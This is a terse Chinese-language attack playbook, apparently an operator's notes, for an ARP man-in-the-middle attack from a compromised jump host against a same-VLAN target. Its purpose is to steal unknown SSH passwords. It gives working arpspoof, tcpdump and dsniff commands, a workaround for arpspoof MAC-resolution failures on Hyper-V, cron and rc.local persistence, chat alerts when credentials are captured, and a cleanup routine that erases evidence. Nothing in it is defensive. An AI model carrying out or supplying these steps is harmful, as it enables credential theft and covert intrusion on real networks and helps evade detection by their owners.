### ARP MITM同L2窃取SSH密码(目标同网段,密码未知)
```
适用: 目标同L2(同Hyper-V宿主/同VLAN)+有已控跳板机+目标SSH密码未知
🚨关键坑: arpspoof报"couldn't arp for host"(libnet解析MAC在Hyper-V/CentOS7常超时)
  修复: ip neigh replace 目标IP lladdr 目标MAC dev eth0 nud permanent (网关同样预填) → 跳过libnet解析,arpspoof即正常
部署: echo 1>/proc/sys/net/ipv4/ip_forward | arpspoof×4双向(目标↔网关各一进程) | tcpdump -w x.pcap -s0 -C100 -W10 host 目标
  dsniff -i eth0 -w /tmp/dsniff.log (专抓SSH/FTP/HTTP明文密码)
持久化: crontab '*/2 * * * * /root/mitm_chk.sh'补位 + rc.local开机自启
验证: pgrep -c arpspoof==4 | tcpdump -r x.pcap看是否截获目标流量
事件通知: hermes cron create 'every 2 minutes' --no-agent --deliver feishu:chat_id (有鱼才通知:脚本检测dsniff日志新内容→stdout输出→投递,无新内容静默)
清理: pkill arpspoof/tcpdump/dsniff | echo 0>ip_forward | crontab去mitm行 | ip neigh del 各条 | rm pcap/log
```
